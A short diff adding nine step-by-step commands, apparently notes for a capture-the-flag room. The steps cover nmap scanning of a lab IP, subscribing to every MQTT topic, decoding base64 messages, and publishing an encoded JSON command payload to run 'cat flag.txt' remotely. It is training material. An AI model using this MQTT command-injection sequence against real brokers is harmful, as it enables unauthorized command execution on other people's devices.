@@ -1,0 +1,9 @@
+1 - nmap -A -p- 10.10.111.59
+2 - mosquitto_sub -h 10.10.111.59 -t "#" -v (background)
+3 - echo hash | base64 -d
+4 - mosquitto_pub -h 10.10.111.59 -t XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub -m '{"CMD"}'
+5 - echo hash | base64 -d
+6 - {"id": "paste_id_here", "cmd": "CMD", "arg": "cat flag.txt"} > BASE64 ENCODe
+7 - mosquitto_sub -t "PUB ID HERE" -h 10.10.111.59 -v
+8 - osquitto_pub -h 10.10.111.59 -t "SUB ID HERE" -m "STEP6 BASE64 HASH"
+9 - echo "hash" | base64 -d (flag)
